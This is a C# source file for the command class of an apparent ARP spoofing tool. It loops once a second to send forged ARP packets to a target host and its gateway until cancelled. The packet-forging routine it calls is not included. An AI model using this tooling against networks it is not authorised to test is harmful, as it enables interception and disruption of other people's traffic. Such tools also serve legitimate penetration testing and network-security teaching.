using System.Net;
using ArpSpoof.Core;
using SharpPcap;
using System.Net.NetworkInformation;

namespace ArpSpoof.Commands;

/// <summary>
/// Provides methods for executing ARP spoofing commands.
/// </summary>
public class ArpSpoofCommands
{
    private ILiveDevice _device;
    private IPAddress _targetIp;
    private PhysicalAddress _targetMac;
    private IPAddress _targetGateway;
    private PhysicalAddress _targetGatewayMac;

    /// <summary>
    /// Initializes a new instance of the <see cref="ArpSpoofCommands"/> class.
    /// </summary>
    /// <param name="device">The live device to use for sending packets.</param>
    /// <param name="targetIp">The IP address of the target device.</param>
    /// <param name="targetMac">The MAC address of the target device.</param>
    /// <param name="targetGateway">The IP address of the target gateway.</param>
    /// <param name="targetGatewayMac">The MAC address of the target gateway.</param>
    public ArpSpoofCommands(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, IPAddress targetGateway, PhysicalAddress targetGatewayMac)
    {
        _device = device;
        _targetIp = targetIp;
        _targetMac = targetMac;
        _targetGateway = targetGateway;
        _targetGatewayMac = targetGatewayMac;
    }

    /// <summary>
    /// Executes the ARP spoofing command.
    /// </summary>
    public async Task ExecuteAsync(CancellationToken ct)
    {
        try
        {
            while (!ct.IsCancellationRequested)
            {
                // Send spoofed ARP packets to the target and gateway
                PacketBuild.Spoof(_device, _targetIp, _targetMac, _targetGateway, _targetGatewayMac);

                // Wait for 1 second before sending the next packets
                await Task.Delay(1000, ct);
            }
        }
        catch (TaskCanceledException)
        {
            _device.Close();
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            throw new Exception(ex.Message);
        }
    }
}
